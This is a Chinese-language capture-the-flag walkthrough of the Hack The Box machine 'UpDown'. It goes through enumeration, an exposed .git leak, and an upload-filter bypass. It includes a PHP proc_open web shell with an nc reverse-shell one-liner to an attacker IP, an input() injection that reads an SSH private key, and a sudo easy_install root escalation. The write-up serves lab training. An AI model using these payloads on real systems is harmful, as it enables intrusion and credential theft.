![在这里插入图片描述](https://img-blog.csdnimg.cn/635b8290a3bb471d8ba153fef582dc9c.png)
题目地址：
```
https://app.hackthebox.com/machines/UpDown
```
# 枚举
使用nmap枚举靶机
```
nmap -sC -sV 10.10.11.177
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4d87cb0cc51c43a7a352ed33ddb44d8a.png)

只开启了22和80端口，我们去网站上看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/660c56c0d1734b85851abc27ff4f355d.png)

在下方发现了一个域名，我们本地dns解析一下
```
echo "10.10.11.177 siteisup.htb" >> /etc/hosts
```
然后枚举网站根目录

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,302,301 -u http://siteisup.htb/FUZZ
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1f7cc17078534d11a152ddaef3c2bb4a.png)

只扫到了一个目录，去到网站上什么也没有


![在这里插入图片描述](https://img-blog.csdnimg.cn/f8a34111f9b445449e0e9a65ad5484a4.png)

枚举一下子域名
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u siteisup.htb
```
枚举到一个dev.siteisup.htb的域名，但是我们无法访问


继续枚举之前那个目录
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,302,301 -u http://siteisup.htb/dev/FUZZ
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/19aa882f8528403589558a741a3b3dab.png)



发现没有扫描出结果，我们在FUZZ前面加一个.，来查看是否有隐藏目录
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,302,301 -u http://siteisup.htb/dev/.FUZZ
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/35ec3a2f371248c6869a660cdae40fff.png)

扫描到一个.git目录，我们去网站上看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/c00b0247d8f44c67854fe3765cbec814.png)

我们用wget将这个文件夹里的所有文件下载下来
```
wget -c -r -np -k -L -p http://siteisup.htb/dev/.git/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b67a2a6ceaef4bd2aaf1b49808a93ab3.png)

然后用GitKraken查看有用的数据
```
https://www.gitkraken.com/download
```
然后将文件夹拖入即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/8cbaf9d2e0684cdaa9ce537689e94922.png)

发现一个奇怪的提交


![在这里插入图片描述](https://img-blog.csdnimg.cn/351ed66eb0b64889ac4e4c0d7b699daf.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/156140a6994f449689bd8983c930c883.png)
```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
根据上面的提示，我们使用burp抓包，添加Special-Dev: only4dev消息头就能访问之前枚举到的那个子域名网站dev.siteisup.htb

我们先将这个域名添加到本地的dns解析
```
echo "10.10.11.177 dev.siteisup.htb" >> /etc/hosts
```

然后启动burp



![在这里插入图片描述](https://img-blog.csdnimg.cn/70302ad5715c4b26a330a5332115643f.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/2e1a2ef4766241b192e0da0dc9e20c9b.png)

成功访问网站，这个网站的功能是上传文件，回到gitkraken，查看checker.php文件
# 代码审计




![在这里插入图片描述](https://img-blog.csdnimg.cn/d27e96c45aac4c4685656a025f7ced17.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/78fb642bddba48c08e98d52a0ec9e27d.png)
```
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
    die("Extension not allowed!");
}
```


这个网站对我们上传的文件扩展名进行了检查，不允许任何.php文件
```
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){
    mkdir($dir, 0770, true);
}
```


然后文件被上传到 /uploads/（md5） 目录

```
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");


$websites = explode("\n",file_get_contents($final_path));
```

然后读取文件的内容
```
foreach($websites as $site){
    $site=trim($site);
    if(!preg_match("#file://#i",$site) &amp;&amp; !preg_match("#data://#i",$site) &amp;&amp; !preg_match("#ftp://#i",$site)){
        $check=isitup($site);
        if($check){
            echo "{$site}<br><font color='green'>is up ^_^</font>";
        }else{
            echo "{$site}<br><font color='red'>seems to be down :(</font>";
        }	
    }else{
        echo "<font color='red'>Hacking attempt was detected !</font>";
    }
}
@unlink($final_path);
```

最后逐个检查站点，检查后删除文件
# 获取服务器shell
根据我们刚刚的分析，我们可以创建一个.phar文件，里面放上很多网站的网址，在文件末尾放上php代码，当checker.php忙于检查站点时，我们访问上传的文件执行代码。

```
touch exp.phar
chmod 777 exp.phar 
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/ddb379c1e0524a07b40ea8761f81af4b.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/22a6545da1fb4be89cefe738214150e7.png)

但是服务器禁用了一些函数，我们不能使用system()、passthru()、shell_exec()、popen()、fsockopen() 等，简单的 PHP 反向 shell用不了，但是proc_open()没有被禁用，我们可以利用这个函数来获取用户shell
```
https://www.php.net/manual/en/function.proc-open.php
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/844ad4cec91d41b8a18976f07136dae4.png)
```
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], '<?php print_r($_ENV); ?>');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
The above example will output somethi
```

然后在这个网站上生成一个shellcode
```
https://www.revshells.com/
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/ca38fbb1c844412ca7424a85bb73b48a.png)
完整的代码为
```
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 5555 >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
The above example will output somethi
```
然后上传文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/03e0f9e3c58e477093abd3d5d2c64b80.png)

注意，我们上传文件和去访问恶意文件时，都要burp抓包加上Special-Dev: only4dev消息头

本地nc监听端口
```
nc -nvlp 5555
```
然后上传文件并去http://dev.siteisup.htb/uploads/访问

![在这里插入图片描述](https://img-blog.csdnimg.cn/082dd4590ee04250808c4370a85e88f0.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/49df71895cdf414da60c32b87ef42c52.png)

现在我们还没有用户权限，在这台机子唯一的一个用户文件夹下，发现了带有suid权限的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/b9d0d42dfd8c431e910143393cab00e4.png)

简单来说，在这个程序执行的时候，权限是developer，我们查看一下这个py文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/ab7768fea00a484d8b0e69afa067f8dd.png)
```
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
这个程序的功能很简单，只是读取了我们输入的内容，但是input函数通过调用容易受到python沙箱逃逸的攻击
相关文章介绍：
```
https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2df820238d0f40c5842d666673d08340.png)
# 获取用户shell


执行文件后，输入以下代码获取developer用户私钥
```
__import__('os').system('cat /home/developer/.ssh/id_rsa')
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f5ca3017182942a7a2113822001963a6.png)

成功获取developer用户私钥，我们在kali上创建一个id_rsa文件，设置权限为600，将这个私钥复制进去

![在这里插入图片描述](https://img-blog.csdnimg.cn/40ddcaac7b7e47329b947dd5a96a0446.png)


然后ssh连接
```
ssh -i id_rsa developer@10.10.11.177
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/3fb6d0caad764436ac35895fa36fbfb2.png)

成功获得用户shell
# 提权
然后输入sudo -l 查看当前用户能用sudo执行什么

![在这里插入图片描述](https://img-blog.csdnimg.cn/2fa36a3e8308477e8b578e21752ca494.png)

去这个网站搜索这个程序

```
https://gtfobins.github.io/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7cb70377f19e486eb5d632313dac0a36.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/95e8d20de8fb4e7b965aff3b4a2a5e52.png)

找到sudo，执行以下内容
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/00f004c08b2648de9039fc4127be4e83.png)

成功获得root权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/541dd188040d4e49bfb29eeffc9e21d3.png)

